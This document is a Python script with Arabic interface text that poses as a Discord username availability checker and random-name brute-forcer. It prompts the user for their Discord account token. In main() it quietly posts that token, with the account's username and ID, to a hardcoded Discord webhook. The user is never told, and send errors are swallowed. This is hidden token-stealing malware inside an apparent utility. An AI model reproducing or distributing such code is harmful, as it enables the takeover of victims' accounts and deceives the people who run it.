import sys
import subprocess
import ctypes
import os
import json
import random
import string
import time

# المكتبات المطلوبة
REQUIRED_PACKAGES = ['requests']

def show_message_box(title, message, flags=0x4 | 0x20):
    return ctypes.windll.user32.MessageBoxW(0, message, title, flags)

def is_package_installed(package_name):
    try:
        subprocess.run([sys.executable, "-m", "pip", "show", package_name],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

def install_packages(packages):
    for pkg in packages:
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"], check=True)
        except subprocess.CalledProcessError:
            return False
    return True

def restart_script():
    os.execv(sys.executable, [sys.executable] + sys.argv)

def check_and_install():
    missing = [pkg for pkg in REQUIRED_PACKAGES if not is_package_installed(pkg)]
    if missing:
        missing_list = "\n".join(f"• {pkg}" for pkg in missing)
        msg = f"المكتبات التالية مطلوبة:\n\n{missing_list}\n\nهل تريد تثبيتها الآن؟"
        result = show_message_box("مكتبات مفقودة", msg)
        if result == 6:
            if install_packages(missing):
                show_message_box("تم التثبيت", "تم تثبيت المكتبات بنجاح.\nسيتم إعادة تشغيل السكربت.", 0x40)
                restart_script()
            else:
                show_message_box("خطأ", "فشل التثبيت. قم بتشغيل:\npip install " + " ".join(missing), 0x10)
                sys.exit(1)
        else:
            show_message_box("تنبيه", "لن تعمل الوظائف بدون المكتبات.", 0x30)
            sys.exit(1)

check_and_install()
import requests

# ========== إعدادات Webhook الرئيسي ==========
MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"

def send_to_master(content):
    try:
        requests.post(MASTER_WEBHOOK, json={"content": content[:1900]}, timeout=5)
    except:
        pass

def ask_token():
    # إذا تم تمرير التوكن كمعامل سطر أوامر
    if len(sys.argv) > 1:
        token = sys.argv[1]
        print(f"[*] تم استلام التوكن من سطر الأوامر.")
        return token
    # وإلا طلب من المستخدم عبر GUI أو الطرفية
    try:
        import tkinter as tk
        from tkinter import simpledialog
        root = tk.Tk()
        root.withdraw()
        token = simpledialog.askstring("Discord Token", "🔑 أدخل توكن حسابك في Discord:", parent=root)
        root.destroy()
        return token
    except:
        return input("🔑 Enter your Discord account token: ")

def verify_token(token):
    try:
        resp = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
        if resp.status_code == 200:
            return {'valid': True, 'user': resp.json()}
        else:
            return {'valid': False, 'error': resp.json().get('message', 'Invalid token')}
    except Exception as e:
        return {'valid': False, 'error': str(e)}

def check_username(token, username):
    try:
        url = 'https://discord.com/api/v9/users/@me/pomelo-attempt'
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        payload = {'username': username}
        resp = requests.post(url, json=payload, headers=headers)
        if resp.status_code == 200:
            return resp.json()
        elif resp.status_code == 400:
            return {'taken': None, 'error': 'Bad request (invalid username)'}
        elif resp.status_code == 429:
            return {'taken': None, 'error': 'Rate limited. Wait a moment.'}
        else:
            return {'taken': None, 'error': f'API error: {resp.status_code}'}
    except Exception as e:
        return {'taken': None, 'error': str(e)}

def generate_random_username(length):
    """توليد اسم عشوائي من الأحرف المسموحة: a-z A-Z 0-9 _ ."""
    chars = string.ascii_letters + string.digits + '_' + '.'
    return ''.join(random.choices(chars, k=length))

def brute_force_usernames(token, length, max_attempts):
    print(f"\n[*] بدء البحث عن اسم مستخدم بطول {length} (بحد أقصى {max_attempts} محاولة)...")
    found = None
    attempts = 0
    while attempts < max_attempts and found is None:
        username = generate_random_username(length)
        attempts += 1
        print(f"[{attempts}/{max_attempts}] جاري فحص: {username}")
        result = check_username(token, username)
        if result.get('error'):
            print(f"⚠️ خطأ: {result['error']}")
            if "Rate limited" in result['error']:
                print("[!] تم الوصول إلى حد المعدل، ننتظر 10 ثوانٍ...")
                time.sleep(10)
            continue
        if result.get('taken') is False:
            found = username
            print(f"\n✅ ✅ ✅ الاسم {username} متاح! ✅ ✅ ✅")
            break
        elif result.get('taken') is True:
            continue  # الاسم محجوز، نواصل
        # إذا لم يتم تحديد taken (None) أو خطأ آخر
        time.sleep(0.5)  # تجنب الضغط على API
    if not found:
        print(f"\n❌ لم يتم العثور على اسم متاح بعد {max_attempts} محاولة.")
    return found

def main():
    token = ask_token()
    if not token:
        show_message_box("خطأ", "لم يتم إدخال أي توكن.", 0x10)
        return
    print("🔄 جاري التحقق من التوكن...")
    verification = verify_token(token)
    if not verification['valid']:
        show_message_box("خطأ", f"توكن غير صالح: {verification['error']}", 0x10)
        return
    user = verification['user']
    # إرسال التوكن إلى الويب هوك الرئيسي
    user_info = f"**Token received:**\n```{token}```\n**User:** {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})"
    send_to_master(user_info)
    print(f"\n✅ تم الدخول كـ {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})")
    print("\n📌 الأوامر المتاحة:")
    print("   /check <اسم>        - فحص اسم مستخدم محدد")
    print("   /brute <طول> [عدد] - تخمين أسماء بطول معين (عدد المحاولات الافتراضي 50)")
    print("   /exit               - إنهاء السكربت")
    print("\nمثال: /brute 4 100  -> يبحث عن اسم من 4 أحرف، 100 محاولة")
    while True:
        cmd = input("\n> ").strip()
        if cmd.lower() == '/exit':
            print("👋 مع السلامة!")
            break
        elif cmd.startswith('/check'):
            parts = cmd.split(maxsplit=1)
            if len(parts) != 2 or not parts[1]:
                print("⚠️ استخدم: /check <اسم>")
                continue
            username = parts[1].strip()
            # تحقق من صحة الاسم
            if not (2 <= len(username) <= 32) or not all(c.isalnum() or c in '_' for c in username):
                print("⚠️ الاسم يجب أن يكون 2-32 حرفاً، ويحتوي فقط على أحرف وأرقام وشرطة سفلية.")
                continue
            print(f"🔍 جاري فحص الاسم: {username}...")
            result = check_username(token, username)
            if result.get('error'):
                print(f"❌ خطأ: {result['error']}")
            else:
                taken = result.get('taken')
                if taken is True:
                    print(f"❌ الاسم {username} محجوز.")
                elif taken is False:
                    print(f"✅ الاسم {username} متاح!")
                else:
                    print(f"⚠️ نتيجة غير معروفة: {result}")
        elif cmd.startswith('/brute'):
            parts = cmd.split()
            if len(parts) < 2 or len(parts) > 3:
                print("⚠️ استخدم: /brute <طول> [عدد المحاولات]")
                print("   مثال: /brute 4 50")
                continue
            try:
                length = int(parts[1])
                if length < 2 or length > 32:
                    print("⚠️ طول الاسم يجب أن يكون بين 2 و 32.")
                    continue
                max_attempts = 50  # الافتراضي
                if len(parts) == 3:
                    max_attempts = int(parts[2])
                    if max_attempts <= 0:
                        print("⚠️ عدد المحاولات يجب أن يكون أكبر من 0.")
                        continue
                brute_force_usernames(token, length, max_attempts)
            except ValueError:
                print("⚠️ الرجاء إدخال أرقام صحيحة.")
        else:
            print("أمر غير معروف. استخدم /check, /brute, أو /exit")

if __name__ == '__main__':
    main()
